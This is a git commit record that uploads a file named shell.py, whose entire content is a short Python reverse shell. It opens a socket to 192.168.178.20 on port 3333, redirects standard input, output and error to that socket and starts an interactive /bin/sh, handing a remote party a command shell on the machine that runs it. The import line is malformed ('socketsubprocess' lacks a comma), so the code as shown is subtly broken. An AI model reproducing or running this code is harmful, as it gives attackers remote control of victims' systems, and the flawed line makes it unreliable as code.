97026584a9038ec65e54e78decc07f408ee0611d
Lucian <medrihanlucian@gmail.com>
2020-11-21 03:22:32 +0100

    Add files via upload

---
+++ shell.py
@@ -0,0 +1,7 @@
+import socketsubprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('192.168.178.20',3333))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);
